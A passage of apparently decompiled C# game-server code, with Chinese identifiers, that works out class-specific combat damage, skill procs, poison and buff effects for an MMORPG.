						case 2:
							攻击类型3 = 130;
							break;
						case 3:
							攻击类型3 = 131;
							break;
						case 4:
							攻击类型3 = 132;
							break;
						case 5:
							攻击类型3 = 133;
							break;
						default:
							攻击类型3 = 129;
							break;
						case 7:
							攻击类型3 = 128;
							break;
						}
						num49 = (num42 - num44 + (double)(num48 / 4)) * 2.0;
					}
				}
				else if (base.Player_Job == 5)
				{
					switch (RNG.Next(0, 6))
					{
					case 1:
						攻击类型3 = 126;
						break;
					case 2:
						攻击类型3 = 126;
						break;
					case 3:
						攻击类型3 = 127;
						break;
					default:
						攻击类型3 = 126;
						break;
					case 6:
						攻击类型3 = 127;
						break;
					}
				}
				else if (base.Player_Job == 7)
				{
					switch (RNG.Next(0, 10))
					{
					case 1:
						攻击类型3 = 126;
						break;
					case 2:
						攻击类型3 = 126;
						break;
					case 3:
						攻击类型3 = 127;
						break;
					case 4:
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型3 = 128;
						break;
					case 5:
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型3 = 129;
						break;
					case 6:
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型3 = 130;
						break;
					default:
						攻击类型3 = 126;
						break;
					case 8:
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型3 = 132;
						break;
					case 9:
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						攻击类型3 = 133;
						break;
					case 10:
						攻击类型3 = 134;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				else if (base.Player_Job == 13)
				{
					switch (RNG.Next(0, 6))
					{
					case 1:
						攻击类型3 = 126;
						break;
					case 2:
						攻击类型3 = 126;
						break;
					case 3:
						攻击类型3 = 127;
						break;
					default:
						攻击类型3 = 126;
						break;
					case 6:
						攻击类型3 = 127;
						break;
					}
				}
				else if (base.Player_Job > 7)
				{
					switch (RNG.Next(0, 10))
					{
					default:
						攻击类型3 = 126;
						break;
					case 1:
						攻击类型3 = 126;
						break;
					case 2:
						攻击类型3 = 127;
						break;
					case 3:
						攻击类型3 = 128;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 4:
						攻击类型3 = 128;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 5:
						攻击类型3 = 129;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 6:
						攻击类型3 = 130;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 7:
						攻击类型3 = 131;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 8:
						攻击类型3 = 132;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 9:
						攻击类型3 = 133;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 10:
						攻击类型3 = 134;
						num49 = ((num42 - num44) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				if (!value8.检查毒蛇出洞状态())
				{
					if (value8.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= value8.剑_升天三气功_护身罡气)
						{
							num49 *= 0.5;
							value8.显示大字(value8.人物全服ID, 25);
						}
						if ((double)RNG.Next(1, 100) <= value8.剑_回柳身法)
						{
							num49 = 0.0;
						}
					}
					else if (value8.Player_Job == 5)
					{
						if ((double)RNG.Next(1, 100) <= base.升天一气功_狂风天意 && !value8.怒)
						{
							value8.人物_SP = value8.人物最大_SP + 5;
						}
						if ((double)RNG.Next(1, 100) <= base.升天五式_形移妖相)
						{
							num49 = 0.0;
							显示大字(base.人物全服ID, 1018);
						}
					}
					else if (value8.Player_Job == 6)
					{
						if ((double)RNG.Next(1, 110) <= value8.刺_三花聚顶)
						{
							value8.刺_连消带打数量 = num49 * value8.刺_连消带打;
							num49 = 0.0;
						}
						if ((double)RNG.Next(1, 110) <= value8.刺_升天一气功_夜魔缠身)
						{
							num49 *= 0.7;
							value8.显示大字(value8.人物全服ID, 370);
						}
						if ((double)RNG.Next(1, 100) <= value8.刺_升天二气功_顺水推舟)
						{
							value8.加血((int)(num49 * 0.2));
							value8.显示大字(value8.人物全服ID, 371);
						}
					}
					else if (value8.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 100) <= value8.谭_护身罡气)
						{
							num49 *= 0.5;
							value8.显示大字(value8.人物全服ID, 25);
						}
						if ((double)RNG.Next(1, 100) <= value8.谭_回柳身法)
						{
							num49 = 0.0;
						}
						if ((double)RNG.Next(1, 100) <= value8.谭_升天三气功_以柔克刚 + value8.升天五式_惊涛骇浪)
						{
							value8.显示大字(value8.人物全服ID, 700);
							num49 *= 0.5;
						}
					}
					else if (value8.Player_Job == 10)
					{
						if (num49 > (double)(value8.人物_HP / 2) && (double)RNG.Next(1, 110) <= value8.拳师_金刚不坏)
						{
							value8.显示大字(value8.人物全服ID, 554);
							num49 *= 1.0 - value8.拳师_金刚不坏 * 0.01;
						}
					}
					else if (value8.Player_Job == 11)
					{
						if ((base.Player_Job == 1 || base.Player_Job == 8) && value8.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= value8.梅_嫉妒的化身)
						{
							double num83 = num49 * (得到气功加成值(value8.Player_Job, 9, 1) / 2.0);
							num49 -= num83;
							value8.显示大字(value8.人物全服ID, 808);
						}
						if (value8.梅_障力恢复 > 0.0 && value8.人物_AP * 2 < value8.人物最大_AP && (double)RNG.Next(1, 100) <= value8.梅_障力恢复)
						{
							value8.人物_AP = value8.人物最大_AP;
							value8.显示大字(value8.人物全服ID, 801);
						}
						if (value8.梅_愤怒爆发 > 0.0 && RNG.Next(1, 100) <= 40 && value8.怒点 < 3)
						{
							value8.怒点++;
						}
						if (value8.梅_吸血进击 > 0.0 && (double)RNG.Next(1, 100) <= value8.梅_吸血进击 && value8.人物_HP * 2 < value8.人物最大_HP)
						{
							int num84 = (int)(num49 / 2.0);
							if (num84 > 2000)
							{
								num84 = 2000;
							}
							value8.加血(num84);
							value8.显示大字(value8.人物全服ID, 804);
							value8.更新HP_MP_SP();
						}
					}
				}
				if (base.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_中毒概率百分比 && !value8.GetAbnormalState(3))
				{
					异常状态类 value16 = new 异常状态类(value8, 60000, 3, 0.0);
					value8.异常状态.Add(3, value16);
					value8.中毒 = true;
				}
				if (value8.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= value8.FLD_装备_追加_中毒概率百分比 && !GetAbnormalState(3))
				{
					异常状态.Add(3, new 异常状态类(this, 60000, 3, 0.0));
					中毒 = true;
				}
				if (num40 != 1)
				{
					num49 *= 1.0 - value8.FLD_装备_追加_降低百分比攻击;
				}
				if (value8.FLD_装备_降低_伤害值 > 0.0)
				{
					num49 -= (double)(int)value8.FLD_装备_降低_伤害值;
				}
				num = 67;
				升天四气功触发(value8);
				double num85 = RNG.Next((int)num49 - 15, (int)num49 + 15);
				if (num85 <= 0.0)
				{
					num85 = 0.0;
				}
				else if (!检查毒蛇出洞状态())
				{
					if (base.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num85 * 0.5));
						}
					}
					if (base.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num85 * 0.5));
						}
					}
				}
				if (base.FLD_装备_追加_伤害值 > 0)
				{
					num85 += (double)base.FLD_装备_追加_伤害值;
				}
				double num86 = RNG.Next((int)num85 - 15, (int)num85 + 15);
				if (num86 <= 1.0)
				{
					num86 = RNG.Next(1, 5);
				}
				else if (中级附魂_愤怒 != 0 && RNG.Next(1, 80) <= 中级附魂_愤怒)
				{
					num86 *= 1.2;
					显示大字(base.人物全服ID, 404);
				}
				if (value8.Player_Job == 11)
				{
					if (value8.梅_障力激活 > 0.0)
					{
						num43 = (int)(num86 * (value8.梅_障力激活 * 0.01));
						if (num43 > value8.人物_AP)
						{
							num43 = value8.人物_AP;
						}
						value8.人物_AP -= num43;
					}
				}
				else
				{
					num43 = 0;
				}
				double num87 = num86 - (double)num43;
				if (num87 <= 1.0)
				{
					num87 = 1.0;
				}
				攻击计算完成(this, 人物ID, 武功ID, (int)num87, 攻击类型3, 0, num43);
				end_IL_0002:;
			}
			catch (Exception ex)
			{
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				Form1.WriteLine(1, "物理攻击2|" + num + "|" + base.人物全服ID + "|" + ToString() + "|" + 人物ID + "|" + ex.Message);
			}
		}

		public void 攻击计算(武功类 武功, NpcClass npcTemp, int 武功ID, int 人物ID, int 临时武功)
		{
			try
			{
				if (武功ID == 3000401 && !npcTemp.ContainsKeyInAbnormalState(4))
				{
					异常状态类 value = new 异常状态类(npcTemp, base.人物全服ID, 3000, 4, 0.0);
					npcTemp.异常状态.Add(4, value);
					发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, npcTemp.Rxjh_HP, 0, 0);
				}
				else
				{
					if (base.陵劲淬砺 > 0.0)
					{
						触发属性提升 = 0;
						if (base.陵劲淬砺 >= (double)RNG.Next(1, 100))
						{
							触发属性提升 = 2;
							计算人物装备数据();
							显示大字(base.人物全服ID, 1011);
						}
					}
					double num = npcTemp.FLD_DF;
					double num2 = base.FLD_人物基本_攻击;
					if (base.FLD_装备_追加_降低百分比防御 > 0.0)
					{
						num *= 1.0 - base.FLD_装备_追加_降低百分比防御;
					}
					if (中级附魂_复仇 != 0 && (double)RNG.Next(1, 80) <= (double)中级附魂_复仇)
					{
						num *= 0.8;
						显示大字(base.人物全服ID, 401);
					}
					if (base.Player_Job == 1)
					{
						if ((double)RNG.Next(1, 110) <= base.破甲几率)
						{
							num *= 得到气功加成值(1, 5, 1);
							显示大字(base.人物全服ID, 16);
						}
					}
					else if (base.Player_Job == 2)
					{
						double num3 = RNG.Next(1, 100);
						double num4 = RNG.Next(1, 100);
						double num5 = 0.0;
						if (num4 <= base.剑_乘胜追击)
						{
							num3 -= base.剑_乘胜追击;
							num5 += base.剑_乘胜追击 * 0.1;
						}
						if (num3 <= base.剑_无坚不摧)
						{
							num *= 得到气功加成值(2, 9, 1) - num5;
							显示大字(base.人物全服ID, 120);
						}
					}
					else if (base.Player_Job == 8 && (double)RNG.Next(1, 110) <= base.破甲几率)
					{
						num *= 得到气功加成值(8, 7, 1);
						显示大字(base.人物全服ID, 16);
					}
					int num6 = 0;
					if (武功.FLD_武功类型 == 3)
					{
						num6 = 武功.FLD_AT + (武功新[武功.FLD_武功类型, 武功.FLD_INDEX].武功_等级 - 1) * 武功.FLD_每级加危害;
					}
					else if (武功.FLD_武功类型 == 2)
					{
						num6 = base.夫妻武功攻击力;
					}
					else if (武功.FLD_每级危害.Length <= 0)
					{
						num6 = ((base.Player_Job != 10 || 临时武功 == 0) ? ((武功.FLD_PID == 师傅数据.STWG1 || 武功.FLD_PID == 师傅数据.STWG2 || 武功.FLD_PID == 师傅数据.STWG2) ? (武功.FLD_AT * (10 - 师傅数据.STLEVEL) / 10) : ((武功.FLD_武功类型 != 2) ? 计算升天武功威力(武功) : base.夫妻武功攻击力)) : ((临时武功 != 0) ? ((int)((double)num6 * (1.0 + base.拳师_水火一体) + (double)(base.Player_Level * 5))) : ((int)((double)num6 * (1.0 + base.拳师_磨杵成针)))));
					}
					else
					{
						int at = 武功.GetAt(武功.FLD_PID, 武功新[武功.FLD_武功类型, 武功.FLD_INDEX].武功_等级);
						if (at > 0)
						{
							num6 = at;
						}
					}
					if (base.Player_Job == 11)
					{
						if (base.梅_玄武危化 > 0.0)
						{
							num6 = (int)((double)num6 * (1.0 + base.梅_玄武危化));
						}
						if (怒点 >= 3)
						{
							怒点 = 0;
							if (base.梅_愤怒爆发 > 0.0)
							{
								num6 = (int)((double)num6 * (1.0 + base.梅_愤怒爆发));
								显示大字(base.人物全服ID, 802);
							}
							更新HP_MP_SP();
						}
					}
					double num7 = (num2 - num + (double)base.FLD_人物基本_命中) * 1.5 + (double)num6 * (1.0 + base.FLD_装备_武功攻击力增加百分比 + base.FLD_人物_武功攻击力增加百分比 + base.FLD_人物_气功_武功攻击力增加百分比) + (double)base.FLD_人物基本_命中 * 0.25;
					if (爆毒状态 > 0.0)
					{
						num7 += num7 * 爆毒状态;
						爆毒状态 = 0.0;
					}
					if (num7 <= 0.0)
					{
						double num8 = (base.FLD_装备_追加_伤害值 < 0) ? 0.0 : ((double)base.FLD_装备_追加_伤害值);
						if (num8 <= 1.0)
						{
							num8 = RNG.Next(1, 5);
						}
						攻击计算完成(this, 人物ID, 武功ID, (int)num8, 0, npcTemp.Rxjh_HP, 0);
					}
					else
					{
						if (base.Player_Job == 1)
						{
							if ((double)RNG.Next(1, 100) <= base.真武绝击)
							{
								显示大字(base.人物全服ID, 17);
								num7 *= 得到气功加成值(1, 7, 1);
							}
							if ((double)RNG.Next(1, 100) <= base.暗影绝杀)
							{
								显示大字(base.人物全服ID, 18);
								num7 *= 得到气功加成值(1, 9, 1);
							}
							if ((double)RNG.Next(1, 100) <= base.刀_梵音破镜 + base.升天五式_龙魂附体)
							{
								double num9 = 得到气功加成值(1, 10, 1);
								if (base.刀_升天三气功_火龙之火 > 0.0)
								{
									num9 += base.刀_升天三气功_火龙之火;
								}
								显示大字(base.人物全服ID, 312);
								num7 = (int)(num7 * (1.0 + num9));
							}
							if ((double)RNG.Next(1, 110) <= base.刀_升天一气功_遁出逆境)
							{
								显示大字(base.人物全服ID, 310);
								if (追加状态列表 != null)
								{
									if (GetAddState(700310))
									{
										追加状态列表[700310].时间结束事件();
									}
								}
								else
								{
									追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
								}
								追加状态类 追加状态类 = new 追加状态类(this, 10000, 700310, 0);
								追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
								addFLD_追加百分比_防御(0.1);
								base.FLD_人物_气功_武功攻击力增加百分比 += 0.3;
								更新武功和状态();
							}
						}
						else if (base.Player_Job == 2)
						{
							if ((double)RNG.Next(1, 100) < base.剑_怒海狂澜)
							{
								num7 *= 得到气功加成值(2, 7, 1);
							}
							if (base.剑_破天一剑 != 0.0)
							{
								num7 *= 1.0 + base.剑_破天一剑;
							}
							if ((double)RNG.Next(1, 100) <= base.升天五式_惊天动地)
							{
								num7 *= 1.35;
								显示大字(base.人物全服ID, 1015);
							}
						}
						else if (base.Player_Job == 3)
						{
							double num10 = 0.4;
							double num11 = base.枪_升天一气功_破甲刺魂;
							double num12 = RNG.Next(1, 100);
							if (武功.FLD_武功类型 == 3 && 武功新[3, 武功.FLD_INDEX].武功_等级 >= 5)
							{
								if (怒)
								{
									num11 += base.枪_升天二气功_以退为进;
									num10 += base.枪_升天二气功_以退为进 * 0.01;
								}
								if (num12 <= num11)
								{
									num7 += (double)base.FLD_装备_追加_防御New * num10;
									显示大字(base.人物全服ID, 330);
								}
							}
							if ((double)RNG.Next(1, 100) <= base.枪_怒意之吼)
							{
								double num13 = 得到气功加成值(3, 10, 1);
								显示大字(base.人物全服ID, 332);
								if (怒)
								{
									num13 += base.枪_升天三气功_怒意之火;
								}
								num7 *= 1.0 + num13;
							}
							if (!怒 && (double)RNG.Next(1, 100) <= base.升天五式_灭世狂舞)
							{
								num7 *= 1.2;
								显示大字(base.人物全服ID, 1016);
							}
						}
						else if (base.Player_Job == 4)
						{
							num7 += base.弓_锐利之箭 + 1.0;
							if ((double)RNG.Next(1, 100) <= base.弓_无明暗矢)
							{
								num7 *= 1.05 + base.弓_无明暗矢 * 0.01;
								显示大字(base.人物全服ID, 49);
							}
							if ((double)RNG.Next(1, 100) <= base.弓_升天三气功_天外三矢)
							{
								显示大字(base.人物全服ID, 342);
								if (武功.FLD_武功类型 == 3 && 武功新[3, 武功.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.弓_升天一气功_绝影射魂)
								{
									显示大字(base.人物全服ID, 340);
									num7 *= 1.25;
								}
							}
							if (武功.FLD_TYPE == 4)
							{
								int num14 = RNG.Next(1, 110);
								int num15 = RNG.Next(1, 120);
								if ((double)num14 <= base.弓_心神凝聚)
								{
									base.弓群攻触发心神 = true;
									num7 *= 1.65;
								}
								else if ((double)num15 <= base.弓_致命绝杀)
								{
									double num16 = base.弓_致命绝杀 * 得到气功加成值(4, 11, 1);
									num7 *= 1.0 + num16 / 2.5;
									显示大字(base.人物全服ID, 140);
								}
							}
							if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
							{
								num7 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
								显示大字(base.人物全服ID, 1017);
							}
						}
						else if (base.Player_Job == 5)
						{
							num7 *= 1.0 + base.医_长攻击力 * 2.0;
							if ((double)RNG.Next(1, 100) <= base.真武绝击)
							{
								显示大字(base.人物全服ID, 17);
								num7 *= 得到气功加成值(5, 7, 1);
							}
							double num17 = (base.医_无中生有 - base.医_狂意护体) * 0.01;
							if ((double)RNG.Next(1, 100) <= base.医_无中生有)
							{
								显示大字(base.人物全服ID, 351);
								if (武功.FLD_武功类型 == 3 && 武功新[3, 武功.FLD_INDEX].武功_等级 >= 5 && (double)RNG.Next(1, 100) <= base.医_升天三气功_明镜止水)
								{
									显示大字(base.人物全服ID, 352);
									num17 *= 2.0;
								}
								if (num17 > 0.0)
								{
									num7 += (double)(int)(num7 * num17);
								}
							}
						}
						else if (base.Player_Job == 6)
						{
							try
							{
								if (武功.FLD_PID == 801303)
								{
									if ((int)DateTime.Now.Subtract(Pktime801303).TotalSeconds < 30)
									{
										return;
									}
									Pktime801303 = DateTime.Now;
									num7 = 0.0;
									怒气++;
									if (怒气 > 5)
									{
										怒气 = 5;
									}
								}
								else if (武功.FLD_INDEX != 1 && 武功.FLD_INDEX != 5 && 武功.FLD_INDEX != 9 && 武功.FLD_INDEX != 13 && 武功.FLD_INDEX != 17 && 武功.FLD_INDEX != 21 && 武功.FLD_INDEX != 25)
								{
									if (武功.FLD_INDEX != 2 && 武功.FLD_INDEX != 6 && 武功.FLD_INDEX != 10 && 武功.FLD_INDEX != 14 && 武功.FLD_INDEX != 18 && 武功.FLD_INDEX != 22 && 武功.FLD_INDEX != 26)
									{
										if ((武功.FLD_INDEX == 3 || 武功.FLD_INDEX == 7 || 武功.FLD_INDEX == 11 || 武功.FLD_INDEX == 15 || 武功.FLD_INDEX == 19 || 武功.FLD_INDEX == 23 || 武功.FLD_INDEX == 27) && 怒气 > 0)
										{
											num7 += num7 * 0.3 * (double)怒气;
											显示大字(base.人物全服ID, 80);
											怒气 = 0;
										}
									}
									else if (怒气 > 0)
									{
										if (!npcTemp.ContainsKeyInAbnormalState(9))
										{
											double num18 = 10000.0 + base.刺_千蛛万手;
											异常状态类 value2 = new 异常状态类(npcTemp, base.人物全服ID, (int)num18, 9, 0.0);
											npcTemp.异常状态.Add(9, value2);
										}
										double num19 = 0.005;
										switch (武功.FLD_INDEX)
										{
										case 10:
											num19 = 0.009;
											break;
										case 6:
											num19 = 0.007;
											break;
										case 2:
											num19 = 0.005;
											break;
										case 18:
											num19 = 0.013;
											break;
										case 14:
											num19 = 0.011;
											break;
										case 26:
											num19 = 0.02;
											break;
										case 22:
											num19 = 0.015;
											break;
										}
										if (!npcTemp.ContainsKeyInAbnormalState(10))
										{
											double num20 = 10000.0 + base.刺_千蛛万手;
											异常状态类 异常状态类 = new 异常状态类(npcTemp, base.人物全服ID, (int)num20, 10, (int)(num7 * num19));
											异常状态类.异常状态类出血(num7 * num19);
											npcTemp.异常状态.Add(10, 异常状态类);
										}
										怒气--;
									}
								}
								else if (怒气 > 0)
								{
									if (!npcTemp.ContainsKeyInAbnormalState(9))
									{
										double num21 = 10000.0 + base.刺_千蛛万手;
										异常状态类 value3 = new 异常状态类(npcTemp, base.人物全服ID, (int)num21, 9, 0.0);
										npcTemp.异常状态.Add(9, value3);
									}
									if (!npcTemp.ContainsKeyInAbnormalState(11))
									{
										double num22 = 10000.0 + base.刺_千蛛万手;
										异常状态类 value4 = new 异常状态类(npcTemp, base.人物全服ID, (int)num22, 11, 0.0);
										npcTemp.异常状态.Add(11, value4);
									}
									怒气--;
								}
							}
							catch (Exception)
							{
							}
						}
						else if (base.Player_Job == 7)
						{
							if (!GetAddState(900401) && !GetAddState(900402) && !GetAddState(900403))
							{
								int num23 = RNG.Next(1, 100);
								if ((double)RNG.Next(1, 100) <= base.琴师_梅花三弄 * 100.0)
								{
									显示大字(base.人物全服ID, 87);
									int num24;
									if (num23 <= 33)
									{
										num24 = 900401;
										base.琴师状态 = 16;
									}
									else if (num23 >= 33 && num23 <= 66)
									{
										num24 = 900402;
										base.琴师状态 = 32;
									}
									else
									{
										num24 = 900403;
										base.琴师状态 = 64;
									}
									追加状态类 value5 = new 追加状态类(this, 60000, num24, 0);
									追加状态列表.Add(num24, value5);
									状态效果(Buffer.GetBytes(num24), 1, 60000);
									更新人物数据(this);
								}
							}
							if (GetAddState(900401))
							{
								int num25 = RNG.Next(0, 10);
								double num26 = RNG.Next(1, 100);
								int num27 = RNG.Next(1, 100);
								int num28 = RNG.Next(1, 100);
								int num29 = RNG.Next(1, 100);
								base.琴师_三和弦_发动概率 = base.琴师_岳阳三醉 * 0.005 * 100.0;
								if (num26 <= base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
								{
									触发鸾凤和鸣 = true;
									显示大字(base.人物全服ID, 88);
									base.琴师_三和弦_发动概率 *= 2.0;
								}
								if ((double)num27 <= base.琴师_三和弦_发动概率)
								{
									if ((double)num28 <= base.琴师_阳明春晓 * 0.5 && !npcTemp.ContainsKeyInAbnormalState(1))
									{
										int 时间 = (int)(base.琴师_阳明春晓 * 2000.0 + 3000.0);
										异常状态类 value6 = new 异常状态类(npcTemp, base.人物全服ID, 时间, 1, 0.0);
										npcTemp.异常状态.Add(1, value6);
									}
									if ((double)num29 <= base.琴师_潇湘雨夜 * 0.5 && !npcTemp.ContainsKeyInAbnormalState(9))
									{
										int 时间2 = (int)(base.琴师_潇湘雨夜 * 2000.0 + 3000.0);
										异常状态类 value7 = new 异常状态类(npcTemp, base.人物全服ID, 时间2, 2, 0.0);
										npcTemp.异常状态.Add(2, value7);
									}
									if (num25 == 10 && !npcTemp.ContainsKeyInAbnormalState(10))
									{
										异常状态类 异常状态类2 = new 异常状态类(npcTemp, base.人物全服ID, 10000, 10, (int)num7);
										异常状态类2.异常状态类出血(num7);
										npcTemp.异常状态.Add(10, 异常状态类2);
									}
									if (!npcTemp.ContainsKeyInAbnormalState(1) && !npcTemp.ContainsKeyInAbnormalState(2))
									{
										if (num27 <= 50)
										{
											int 时间3 = (int)(base.琴师_阳明春晓 * 2000.0 + 3000.0);
											异常状态类 value8 = new 异常状态类(npcTemp, base.人物全服ID, 时间3, 1, 0.0);
											npcTemp.异常状态.Add(1, value8);
										}
										else
										{
											int 时间4 = (int)(base.琴师_潇湘雨夜 * 2000.0 + 3000.0);
											异常状态类 value9 = new 异常状态类(npcTemp, base.人物全服ID, 时间4, 2, 0.0);
											npcTemp.异常状态.Add(2, value9);
										}
									}
								}
							}
							double num30 = 0.0;
							if (GetAddState(900402) && 武功.FLD_TYPE != 4)
							{
								double num31 = RNG.Next(1, 120);
								num30 = 0.05 + base.琴师_岳阳三醉 * 0.005;
								if (base.琴师_升天三气功_子夜秋歌 > 0.0)
								{
									num30 = ((!(base.琴师_升天三气功_子夜秋歌 >= 2.0)) ? (num30 * 1.1) : (num30 * (1.1 + (base.琴师_升天三气功_子夜秋歌 - 1.0) * 0.0142)));
								}
								if (num31 <= base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
								{
									触发鸾凤和鸣 = true;
									显示大字(base.人物全服ID, 88);
									num30 = ((!(base.琴师_升天一气功_飞花点翠 > 0.0)) ? (num30 * 2.0) : (num30 * (2.02 + base.琴师_升天一气功_飞花点翠 * 0.0002)));
								}
							}
							num7 *= 1.0 + num30;
							if ((double)RNG.Next(1, 100) <= base.升天五式_龙爪纤指手)
							{
								显示大字(base.人物全服ID, 1019);
								num7 *= 1.2;
							}
						}
						else if (base.Player_Job == 8)
						{
							double num32 = 0.0;
							if (韩飞官_天魔狂血叠加次数 >= 2)
							{
								显示大字(base.人物全服ID, 20252);
								num32 = base.韩_升天二气功_天魔护体;
								if (韩飞官_天魔狂血攻击力 > 0.0)
								{
									num7 += 韩飞官_天魔狂血攻击力;
									韩飞官_天魔狂血攻击力 = 0.0;
								}
								韩飞官_天魔狂血叠加次数 = 0;
							}
							if ((double)RNG.Next(1, 100) <= base.真武绝击)
							{
								显示大字(base.人物全服ID, 17);
								num7 *= 得到气功加成值(8, 8, 1);
							}
							if ((double)RNG.Next(1, 100) <= base.暗影绝杀 + num32)
							{
								显示大字(base.人物全服ID, 18);
								num7 *= 得到气功加成值(8, 11, 1);
							}
							if ((double)RNG.Next(1, 110) <= base.韩_升天一气功_行风弄舞 + num32)
							{
								显示大字(base.人物全服ID, 600);
								num7 *= 1.25;
							}
							else if (武功.FLD_CDTIME > 0)
							{
								int num33 = RNG.Next(1, 120);
								if ((double)num33 <= base.韩_天魔狂血 * 2.0)
								{
									显示大字(base.人物全服ID, 252);
									num7 *= 1.2;
									韩飞官_天魔狂血叠加次数 = 1;
									if ((double)num33 <= base.韩_天魔狂血 - 10.0)
									{
										韩飞官_天魔狂血攻击力 = num7 * (0.6 + base.升天五式_天魔之力);
										韩飞官_天魔狂血叠加次数 = 2;
									}
								}
							}
							else
							{
								韩飞官_天魔狂血叠加次数 = 0;
								韩飞官_天魔狂血攻击力 = 0.0;
							}
						}
						else if (base.Player_Job == 9)
						{
							if (武功ID == 2000401)
							{
								double num34 = 4000.0;
								if (npcTemp.异常状态 != null && !npcTemp.ContainsKeyInAbnormalState(8))
								{
									异常状态类 value10 = new 异常状态类(npcTemp, base.人物全服ID, (int)num34, 8, 1.0);
									npcTemp.异常状态.Add(8, value10);
								}
							}
							if ((double)RNG.Next(1, 100) < base.谭_怒海狂澜)
							{
								num7 *= 得到气功加成值(9, 10, 1);
							}
						}
						else if (base.Player_Job == 10)
						{
							if (临时武功 == 3000109)
							{
								num7 *= 1.45;
							}
							if (临时武功 != 0)
							{
								if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
								{
									显示大字(base.人物全服ID, 557);
									num7 *= 1.0 + 拳师会心一击威力;
								}
								if ((double)RNG.Next(1, 100) <= base.拳_升天一气功_夺命连环)
								{
									显示大字(base.人物全服ID, 561);
									num7 *= 1.45;
								}
							}
							else if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
							{
								显示大字(base.人物全服ID, 557);
								num7 *= 1.0 + 拳师会心一击威力 / 2.0;
							}
						}
						else if (base.Player_Job == 11)
						{
							if ((double)RNG.Next(1, 100) <= base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 5, 0))
							{
								num7 *= 1.0 + base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 5, 1);
							}
							if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
							{
								num7 *= 1.4;
								显示大字(base.人物全服ID, 803);
							}
							if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
							{
								num7 += (double)base.人物最大_HP * 0.2;
								显示大字(base.人物全服ID, 806);
							}
						}
						else if (base.Player_Job == 12)
						{
							int num35 = RNG.Next(1, 100);
							触发流星漫天 = false;
							if (base.流星漫天 + base.升天五式_破空坠星 >= (double)RNG.Next(1, 100))
							{
								触发流星漫天 = true;
								显示大字(base.人物全服ID, 1005);
								if (base.技冠群雄 >= (double)RNG.Next(1, 100))
								{
									显示大字(base.人物全服ID, 1013);
									num7 *= 2.0;
								}
							}
							if ((double)num35 <= base.真武绝击)
							{
								显示大字(base.人物全服ID, 17);
								num7 *= 得到气功加成值(12, 5, 1);
							}
						}
						else if (base.Player_Job == 13)
						{
							num7 *= 1.0 + base.神女长功击力 * 2.0;
							int num36 = RNG.Next(1, 100);
							触发杀星义气虎 = false;
							if (base.神女杀星义虎 >= (double)RNG.Next(1, 100) && !触发杀星义气杀)
							{
								触发杀星义气虎 = true;
								显示大字(base.人物全服ID, 1027);
								num7 *= 1.15 + base.神女杀星义气;
							}
							触发杀星义气杀 = false;
							if ((double)num36 <= base.神女杀星义杀 && !触发杀星义气虎)
							{
								触发杀星义气杀 = true;
								显示大字(base.人物全服ID, 1026);
								num7 *= 1.25 + base.神女杀星义气;
							}
							if (base.神女真武绝击 >= (double)RNG.Next(1, 100))
							{
								num7 *= 1.4;
								显示大字(base.人物全服ID, 17);
							}
						}
